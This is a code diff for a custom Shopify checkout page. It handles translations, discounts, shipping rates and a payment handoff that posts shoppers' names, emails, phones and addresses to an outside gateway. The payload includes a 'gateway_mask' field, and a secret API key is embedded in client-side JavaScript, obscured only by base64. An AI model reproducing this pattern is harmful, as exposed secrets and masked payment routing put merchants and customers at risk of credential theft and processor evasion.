+      { code: "CA", name: "Canada" }, 
+      { code: "AU", name: "Australia" }
+    ];
 
-    function initCountries() {
-      const select = document.getElementById('country');
-      allCountries.forEach(c => { const option = document.createElement('option'); option.value = c.code; option.innerText = c.name; select.appendChild(option); });
+    /**
+     * MULTI-LANGUAGE ENGINE
+     */
+    async function applyLanguage(lang) {
+      const BASE_URL = 'https://worldpay-shopify-to-wordpress-ant-live.pages.dev'; 
+      try {
+        const cacheBuster = Date.now();
+        const res = await fetch(`${BASE_URL}/translate/${lang}.json?v=${cacheBuster}`);
+        if (!res.ok) return;
+        const trans = await res.json();
+
+        // Translate text content
+        document.querySelectorAll('[data-i18n]').forEach(el => {
+          const key = el.getAttribute('data-i18n');
+          if (trans[key]) el.textContent = trans[key];
+        });
+
+        // Translate placeholders
+        const placeholders = { 'email': 'placeholder_email', 'address': 'placeholder_address', 'phone': 'placeholder_phone' };
+        for (let id in placeholders) {
+          const el = document.getElementById(id);
+          if (el && trans[placeholders[id]]) el.placeholder = trans[placeholders[id]];
+        }
+
+        document.querySelectorAll('.lang-selector').forEach(s => s.value = lang);
+        localStorage.setItem('preferred_lang', lang);
+      } catch (e) { console.error('i18n load error'); }
     }
 
-    function renderPaymentMethods(currency) {
-      const container = document.getElementById('payment-container');
-      const methods = currencyPaymentMap[currency] || currencyPaymentMap['DEFAULT'];
-      let html = '';
-      methods.forEach((m, index) => {
-        const isChecked = index === 0; if (isChecked) document.getElementById('gateway').value = m.id;
-        html += `<label class="payment-option ${isChecked ? 'selected' : ''}" onclick="selectPayment(this, '${m.id}')"><input type="radio" name="payment_method_radio" ${isChecked ? 'checked' : ''}><div class="payment-name">${m.name}</div><img src="${m.icon}" alt="${m.name}" class="payment-icon"></label>`;
-      });
-      container.innerHTML = html;
-    }
-
-    window.selectPayment = function (el, gatewayId) {
-      document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('selected'));
-      el.classList.add('selected'); el.querySelector('input').checked = true;
-      document.getElementById('gateway').value = gatewayId;
-    };
-
-    const summaryToggle = document.getElementById('summaryToggle');
-    const summaryContent = document.getElementById('summaryContent');
-    summaryToggle.addEventListener('click', () => { summaryContent.classList.toggle('show'); summaryToggle.classList.toggle('expanded'); });
-
+    /**
+     * UI DATA BINDING & UPDATES
+     */
     async function loadCartData() {
       try {
-        // 1. 获取 Shopify 最新的购物车状态
+        // Fetch real-time data from Shopify Cart API
         const res = await fetch('/cart.js');
         currentCart = await res.json();
         
-        // 2. 提取订单级别的折扣应用 (例如自动折扣规则名称)
+        // Extract cart-level discounts (Manual or Automatic)
         currentAppliedDiscounts = currentCart.cart_level_discount_applications || [];
         
-        // 3. 渲染页面
         document.getElementById('currency-tag').innerText = currentCart.currency;
         renderPaymentMethods(currentCart.currency); 
         updateTotalDisplay();
-      } catch (err) {
-        console.error("Failed to load shopify cart data", err);
-      }
+      } catch (err) { console.error("Cart loading failed", err); }
     }
-
-    async function fetchShippingRates() {
-      const country = document.getElementById('country').value, province = document.getElementById('state').value, zip = document.getElementById('zip').value;
-      if (!zip || zip.length < 3 || !country) return;
-      const listDiv = document.getElementById('shipping-rates-list');
-      document.getElementById('shipping-method-area').style.display = 'block';
-      listDiv.innerHTML = "<div style='padding:10px; color:#666;'>Calculating rates...</div>";
-      try {
-        const query = `shipping_address[zip]=${encodeURIComponent(zip)}&shipping_address[country]=${encodeURIComponent(country)}&shipping_address[province]=${encodeURIComponent(province)}`;
-        const res = await fetch(`/cart/shipping_rates.json?${query}`);
-        const data = await res.json(); availableShippingRates = data.shipping_rates;
-        if (availableShippingRates && availableShippingRates.length > 0) {
-          let html = '';
-          availableShippingRates.forEach((rate, index) => {
-            if (index === 0) selectedShippingRate = rate;
-            html += `<div class="shipping-method-item ${index === 0 ? 'selected' : ''}" id="ship-box-${index}" onclick="selectShipping(${index})"><input type="radio" name="s_rate" id="r-${index}" ${index === 0 ? 'checked' : ''}><div style="flex:1;">${rate.name}</div><div style="font-weight:bold;">${rate.price} ${currentCart.currency}</div></div>`;
-          });
-          listDiv.innerHTML = html; updateTotalDisplay();
-        }
-      } catch (err) { }
-    }
-
-    window.selectShipping = function (index) {
-      document.querySelectorAll('.shipping-method-item').forEach(el => el.classList.remove('selected'));
-      document.getElementById(`ship-box-${index}`).classList.add('selected');
-      selectedShippingRate = availableShippingRates[index]; updateTotalDisplay();
-    };
 
     function updateTotalDisplay() {
       if (!currentCart) return;
       
       const currency = currentCart.currency;
-      let totalSavings = 0;
+      let calculatedSavings = 0;
       let productHtml = '';
 
-      // 1. 遍历商品，渲染行项目折扣 (Shopify 自动计算的结果)
+      // 1. Process items and line-level discounts
       currentCart.items.forEach(item => {
-        const originalLinePrice = item.original_line_price / 100;
-        const finalLinePrice = item.final_line_price / 100;
-        const itemDiscount = originalLinePrice - finalLinePrice;
-        totalSavings += itemDiscount;
+        const originalLine = item.original_line_price / 100;
+        const finalLine = item.final_line_price / 100;
+        const lineDiscount = originalLine - finalLine;
+        calculatedSavings += lineDiscount;
 
-        // 获取该商品应用的具体折扣名称 (如果有)
-        let discountBadges = '';
-        if (item.line_level_discount_allocations && item.line_level_discount_allocations.length > 0) {
-          item.line_level_discount_allocations.forEach(disc => {
-            // 这里 disc.discount_application.title 是 Shopify 后台配置的真实名称
-            discountBadges += `
+        let badges = '';
+        if (item.line_level_discount_allocations) {
+          item.line_level_discount_allocations.forEach(d => {
+            badges += `
               <div class="product-discount-badge">
-                <svg viewBox="0 0 16 16"><path d="M16 8c0 .28-.22.5-.5.5h-2.1c-.28 0-.5-.22-.5-.5s.22-.5.5-.5h2.1c.28 0 .5.22.5.5zm-5.41-3.41L12 3.17c.2-.2.2-.51 0-.71-.2-.2-.51-.2-.71 0L9.88 3.88c-.2.2-.2.51 0 .71.2.2.51.2.71 0zM4 12h8v2H4v-2zm0-3h8v2H4V9zm0-3h8v2H4V6zm10.71-3.71c-.2-.2-.51-.2-.71 0L12.59 3.7c-.2.2-.2.51 0 .71.2.2.51.2.71 0l1.41-1.41c.2-.2.2-.51 0-.71zM15 8c0-3.87-3.13-7-7-7S1 4.13 1 8s3.13 7 7 7 7-3.13 7-7zM8 2c3.31 0 6 2.69 6 6s-2.69 6-6 6-6-2.69-6-6 2.69-6 6-6z"/></svg>
-                ${disc.discount_application.title} (-${(disc.amount/100).toFixed(2)} ${currency})
+                [${d.discount_application.title}] -${(d.amount/100).toFixed(2)} ${currency}
               </div>`;
           });
         }
@@ -1087,93 +963,315 @@
               <div class="product-qty-badge">${item.quantity}</div>
             </div>
             <div class="product-info">
-              <div style="font-weight:500;">${item.product_title}</div>
+              <div style="font-weight:600;">${item.product_title}</div>
               <div class="product-variant">${item.variant_title || ''}</div>
-              ${discountBadges}
+              ${badges}
             </div>
             <div class="product-price">
-              ${itemDiscount > 0 ? `<span class="price-original">${originalLinePrice.toFixed(2)} ${currency}</span>` : ''}
-              <span class="price-current">${finalLinePrice.toFixed(2)} ${currency}</span>
+              ${lineDiscount > 0 ? `<span class="price-original">${originalLine.toFixed(2)}</span>` : ''}
+              <span class="price-current">${finalLinePriceText(finalLine)} ${currency}</span>
             </div>
           </div>`;
       });
-
       document.getElementById('product-list').innerHTML = productHtml;
 
-      // 2. 渲染底部金额总计
-      const subtotal = currentCart.original_total_price / 100;
-      const shippingPrice = selectedShippingRate ? parseFloat(selectedShippingRate.price) : 0;
-      
-      // 注意：currentCart.total_price 已经是 Shopify 计算过所有折扣后的最终价了
-      const finalPrice = (currentCart.total_price / 100) + shippingPrice;
+      // 2. Calculate totals using Shopify's logic
+      // Total Discount includes both line level and cart level
+      const totalDiscountAmount = (currentCart.total_discount / 100);
+      const subtotalPostDiscount = (currentCart.total_price / 100);
+      const shipPrice = selectedShippingRate ? parseFloat(selectedShippingRate.price) : 0;
+      const finalGrandTotal = subtotalPostDiscount + shipPrice;
 
-      document.getElementById('subtotal-val').innerText = (currentCart.total_price / 100).toFixed(2) + " " + currency;
+      // 3. Render summary lines
+      document.getElementById('subtotal-val').innerText = subtotalPostDiscount.toFixed(2) + " " + currency;
       
-      // TOTAL SAVINGS 展示
+      const discountRow = document.getElementById('discount-row');
       const savingsBox = document.getElementById('savings-summary-box');
-      if (totalSavings > 0) {
+
+      if (totalDiscountAmount > 0) {
+        discountRow.style.display = 'flex';
+        document.getElementById('discount-val').innerText = "- " + totalDiscountAmount.toFixed(2) + " " + currency;
+        
+        // Display the first matching discount title
+        let mainTitle = "Bundle Discount";
+        if (currentAppliedDiscounts.length > 0) {
+          mainTitle = currentAppliedDiscounts[0].title;
+        } else if (currentCart.items.some(i => i.line_level_discount_allocations.length > 0)) {
+          mainTitle = currentCart.items.find(i => i.line_level_discount_allocations.length > 0).line_level_discount_allocations[0].discount_application.title;
+        }
+        document.getElementById('discount-detail-text').innerText = mainTitle;
+        
         savingsBox.style.display = 'flex';
-        document.getElementById('total-savings-val').innerText = totalSavings.toFixed(2) + " " + currency;
+        document.getElementById('total-savings-val').innerText = totalDiscountAmount.toFixed(2) + " " + currency;
       } else {
+        discountRow.style.display = 'none';
         savingsBox.style.display = 'none';
       }
 
-      document.getElementById('total-val').innerText = finalPrice.toFixed(2);
-      document.getElementById('mobile-total-display').innerText = finalPrice.toFixed(2) + " " + currency;
+      // Shipping label update
+      if (selectedShippingRate) {
+        document.getElementById('shipping-display').innerText = shipPrice.toFixed(2) + " " + currency;
+      } else {
+        document.getElementById('shipping-display').innerText = "Calculated at next step";
+      }
+
+      // FINAL FIGURES
+      document.getElementById('total-val').innerText = finalGrandTotal.toFixed(2);
+      document.getElementById('mobile-total-display').innerText = finalGrandTotal.toFixed(2) + " " + currency;
       
-      // 记录要传给中台的信息
-      window.finalPayAmount = finalPrice.toFixed(2);
-      
-      // 获取折扣标题（取第一个应用的折扣名称透传）
-      window.mainDiscountTitle = currentAppliedDiscounts.length > 0 ? currentAppliedDiscounts[0].title : "";
-      window.totalDiscountAmount = totalSavings.toFixed(2);
+      // Store globally for payment payload
+      window.finalPayAmount = finalGrandTotal.toFixed(2);
+      window.finalDiscountCode = currentAppliedDiscounts.length > 0 ? currentAppliedDiscounts[0].title : "";
+      window.finalDiscountVal = totalDiscountAmount.toFixed(2);
     }
 
-    initCountries(); loadCartData();
-    ['zip', 'state', 'country'].forEach(id => document.getElementById(id).addEventListener('change', fetchShippingRates));
+    function finalLinePriceText(val) { return val.toFixed(2); }
 
-    document.getElementById('payment-form').onsubmit = async (e) => {
+    /**
+     * DISCOUNT CODE APPLICATION
+     */
+    window.applyDiscount = async function() {
+      const codeInput = document.getElementById('coupon-input');
+      const code = codeInput.value.trim();
+      if (!code) return;
+
+      const btn = document.getElementById('apply-coupon-btn');
+      btn.innerText = "Applying...";
+      btn.disabled = true;
+
+      try {
+        // Shopify Discount Endpoint
+        await fetch(`/discount/${encodeURIComponent(code)}`);
+        // Refresh cart data to see what Shopify applied
+        await loadCartData();
+        codeInput.value = "";
+      } catch (e) {
+        alert("Coupon application failed. Please try again.");
+      } finally {
+        btn.innerText = "Apply";
+        btn.disabled = false;
+      }
+    };
+
+    /**
+     * SHIPPING CALCULATION
+     */
+    async function fetchShippingRates() {
+      const country = document.getElementById('country').value;
+      const state = document.getElementById('state').value;
+      const zip = document.getElementById('zip').value;
+      
+      if (!zip || zip.length < 3 || !country) return;
+
+      const listDiv = document.getElementById('shipping-rates-list');
+      document.getElementById('shipping-method-area').style.display = 'block';
+      listDiv.innerHTML = "<div style='padding:10px; color:#666;'>Finding rates...</div>";
+
+      try {
+        const query = `shipping_address[zip]=${encodeURIComponent(zip)}&shipping_address[country]=${encodeURIComponent(country)}&shipping_address[province]=${encodeURIComponent(state)}`;
+        const res = await fetch(`/cart/shipping_rates.json?${query}`);
+        const data = await res.json();
+        
+        availableShippingRates = data.shipping_rates;
+        if (availableShippingRates && availableShippingRates.length > 0) {
+          let html = '';
+          availableShippingRates.forEach((rate, index) => {
+            if (index === 0) selectedShippingRate = rate;
+            const isSelected = index === 0;
+            html += `
+              <div class="shipping-method-item ${isSelected ? 'selected' : ''}" onclick="selectShipping(${index})">
+                <input type="radio" name="sh_radio" ${isSelected ? 'checked' : ''}>
+                <div style="flex:1;">${rate.name}</div>
+                <div style="font-weight:bold;">${rate.price} ${currentCart.currency}</div>
+              </div>`;
+          });
+          listDiv.innerHTML = html;
+          updateTotalDisplay();
+        } else {
+          listDiv.innerHTML = "<div style='padding:10px; color:red;'>No shipping methods available for this location.</div>";
+        }
+      } catch (err) {
+        listDiv.innerHTML = "Error loading shipping rates.";
+      }
+    }
+
+    window.selectShipping = function(index) {
+      selectedShippingRate = availableShippingRates[index];
+      const items = document.querySelectorAll('.shipping-method-item');
+      items.forEach((el, i) => {
+        if (i === index) el.classList.add('selected');
+        else el.classList.remove('selected');
+      });
+      updateTotalDisplay();
+    };
+
+    /**
+     * PAYMENT GATEWAY ROUTING
+     */
+    function renderPaymentMethods(currency) {
+      const container = document.getElementById('payment-container');
+      const methods = currencyPaymentMap[currency] || currencyPaymentMap['DEFAULT'];
+      let html = '';
+      
+      methods.forEach((m, index) => {
+        const isChecked = index === 0;
+        if (isChecked) document.getElementById('gateway').value = m.id;
+        html += `
+          <label class="payment-option ${isChecked ? 'selected' : ''}" onclick="selectPayment(this, '${m.id}')">
+            <input type="radio" name="payment_radio" ${isChecked ? 'checked' : ''}>
+            <div class="payment-name">${m.name}</div>
+            <img src="${m.icon}" alt="${m.name}" class="payment-icon">
+          </label>`;
+      });
+      container.innerHTML = html;
+    }
+
+    window.selectPayment = function (el, gatewayId) {
+      document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('selected'));
+      el.classList.add('selected');
+      el.querySelector('input').checked = true;
+      document.getElementById('gateway').value = gatewayId;
+    };
+
+    /**
+     * FORM SUBMISSION & PAYLOAD DELIVERY
+     */
+    document.getElementById('payment-form').onsubmit = async function(e) {
       e.preventDefault();
+      
+      const gateway = document.getElementById('gateway').value;
       const btn = document.getElementById('submit-btn');
-      const gatewayVal = document.getElementById('gateway').value;
-      if (!gatewayVal) return;
-      showWcrLoading();
+      if (!gateway) return;
 
-      if (gatewayVal === 'shopify_checkout') {
-        const params = new URLSearchParams();
-        const fields = { 'checkout[email]': 'email', 'checkout[shipping_address][first_name]': 'fname', 'checkout[shipping_address][last_name]': 'lname', 'checkout[shipping_address][address1]': 'address', 'checkout[shipping_address][city]': 'city', 'checkout[shipping_address][country]': 'country', 'checkout[shipping_address][province]': 'state', 'checkout[shipping_address][zip]': 'zip', 'checkout[shipping_address][phone]': 'phone' };
-        for (let key in fields) { params.append(key, document.getElementById(fields[key]).value); }
-        window.top.location.href = '/checkout?' + params.toString();
+      document.getElementById('wcr-a-payment-loader').style.display = 'flex';
+
+      // Scenario 1: Fallback to Shopify Native Checkout
+      if (gateway === 'shopify_checkout') {
+        const p = new URLSearchParams();
+        const map = { 
+          'checkout[email]': 'email', 
+          'checkout[shipping_address][first_name]': 'fname', 
+          'checkout[shipping_address][last_name]': 'lname', 
+          'checkout[shipping_address][address1]': 'address', 
+          'checkout[shipping_address][city]': 'city', 
+          'checkout[shipping_address][country]': 'country', 
+          'checkout[shipping_address][province]': 'state', 
+          'checkout[shipping_address][zip]': 'zip', 
+          'checkout[shipping_address][phone]': 'phone' 
+        };
+        for (let k in map) { p.append(k, document.getElementById(map[k]).value); }
+        window.top.location.href = '/checkout?' + p.toString();
         return;
       }
 
+      // Scenario 2: Secure Payment Gateway Handshake
       btn.disabled = true;
       const payload = {
-        order_id: "SH-" + Date.now() + Math.floor(Math.random() * 1000000).toString().padStart(6, '0'), 
-        total_amount: window.finalPayAmount, 
-        currency: currentCart.currency, 
-        // 这里透传的是从 Shopify Cart API 拿到的真实折扣名称和金额
-        discount_code: window.mainDiscountTitle, 
-        discount_amount: window.totalDiscountAmount,
-        gateway_mask: gatewayVal, 
-        origin_domain: window.location.host, 
+        order_id: "SH-" + Date.now() + Math.floor(Math.random() * 1000).toString(),
+        total_amount: window.finalPayAmount,
+        currency: currentCart.currency,
+        gateway_mask: gateway,
+        origin_domain: window.location.host,
         return_url: window.location.origin + "/pages/thank-you",
-        discount_code: currentDiscount.code,
-        discount_amount: currentDiscount.amount,
-        hook_url: "https://test-pay.defitopay.com/api/v2/an/status-update", line_items: currentCart.items.map(item => ({ variant_id: item.variant_id, quantity: item.quantity, title: item.title, price: (item.price / 100).toFixed(2) })), shipping_lines: selectedShippingRate ? [{ title: selectedShippingRate.name, price: selectedShippingRate.price }] : [], 
-        billing: { email: document.getElementById('email').value, phone: document.getElementById('phone').value, first_name: document.getElementById('fname').value, last_name: document.getElementById('lname').value, address1: document.getElementById('address').value, city: document.getElementById('city').value, state: document.getElementById('state').value, postcode: document.getElementById('zip').value, country: document.getElementById('country').value, province: document.getElementById('state').value, zip: document.getElementById('zip').value }
+        hook_url: "https://test-pay.defitopay.com/api/v2/an/status-update",
+        
+        // Pass the actual discount information to the gateway
+        discount_code: window.finalDiscountCode || "",
+        discount_amount: window.finalDiscountVal || 0,
+        
+        line_items: currentCart.items.map(i => ({
+          variant_id: i.variant_id,
+          quantity: i.quantity,
+          title: i.title,
+          price: (i.price / 100).toFixed(2)
+        })),
+        
+        shipping_lines: selectedShippingRate ? [{ title: selectedShippingRate.name, price: selectedShippingRate.price }] : [],
+        
+        billing: {
+          email: document.getElementById('email').value,
+          phone: document.getElementById('phone').value,
+          first_name: document.getElementById('fname').value,
+          last_name: document.getElementById('lname').value,
+          address1: document.getElementById('address').value,
+          city: document.getElementById('city').value,
+          state: document.getElementById('state').value,
+          postcode: document.getElementById('zip').value,
+          country: document.getElementById('country').value
+        }
       };
+
+      // API Security Keys
       const _p = "TUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGRERGUThBTUlJQkNnS0NBUUVBb0RPWG1wU0FZelNERjNKdSthRUhabVJSdk5XRDZDQ0N3dVVMUW1kR0pnb0pqV1d4Ym1hQQ==";
       const _s = "TUlJRXZRSUJBREFOQmdrcWhraUc5dzBCQVFFRkFBU0NCS2N3Z2dTakFnRUFBb0lCQVFESC96Mkp0amRjNDdMQm11eFJLTmhsbENQQUZscEI0SGhpbkV5MFRnRUtUZUJaKzZxVkJrMmMxaGJqVWFYUXdkZ0R3UTRTMEo=";
 
       try {
-        const response = await fetch('https://test-pay.defitopay.com/v1/an/checkout', { method: 'POST', headers: { 'Content-Type': 'application/json', 'worldpay_public_key': atob(_p), 'cus_secret_key': atob(_s), 'X-Customer-Language': navigator.language }, body: JSON.stringify(payload) });
+        const response = await fetch('https://test-pay.defitopay.com/v1/an/checkout', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'worldpay_public_key': atob(_p),
+            'cus_secret_key': atob(_s),
+            'X-Customer-Language': navigator.language
+          },
+          body: JSON.stringify(payload)
+        });
+
         const result = await response.json();
-        if (result.pay_url) { window.top.location.href = result.pay_url; }
-        else { hideWcrLoading(); alert("Error: " + result.message); btn.disabled = false; }
-      } catch (err) { hideWcrLoading(); alert("System Error."); btn.disabled = false; }
+        if (result.pay_url) {
+          window.top.location.href = result.pay_url;
+        } else {
+          document.getElementById('wcr-a-payment-loader').style.display = 'none';
+          alert("Error: " + result.message);
+          btn.disabled = false;
+        }
+      } catch (err) {
+        document.getElementById('wcr-a-payment-loader').style.display = 'none';
+        alert("Payment system currently unavailable. Please try again later.");
+        btn.disabled = false;
+      }
     };
-   
+
+    /**
+     * INITIALIZATION & EVENT LISTENERS
+     */
+    function initCountries() {
+      const select = document.getElementById('country');
+      allCountries.forEach(c => {
+        const op = document.createElement('option');
+        op.value = c.code;
+        op.innerText = c.name;
+        select.appendChild(op);
+      });
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      // Initialize summary toggle
+      const toggle = document.getElementById('summaryToggle');
+      const content = document.getElementById('summaryContent');
+      toggle.onclick = () => {
+        content.classList.toggle('show');
+        toggle.classList.toggle('expanded');
+      };
+
+      // Shipping trigger listeners
+      ['zip', 'state', 'country'].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) el.addEventListener('change', fetchShippingRates);
+      });
+
+      // Language init
+      const savedLang = localStorage.getItem('preferred_lang');
+      const browserLang = navigator.language.split('-')[0];
+      const targetLang = savedLang || (['ja','ko','zh'].includes(browserLang) ? (browserLang === 'zh' ? 'zh-TW' : browserLang) : 'en');
+      
+      applyLanguage(targetLang);
+      document.querySelectorAll('.lang-selector').forEach(s => s.onchange = (e) => applyLanguage(e.target.value));
+
+      // Load shopify data
+      initCountries();
+      loadCartData();
+    });
   </script>
 </body>
 
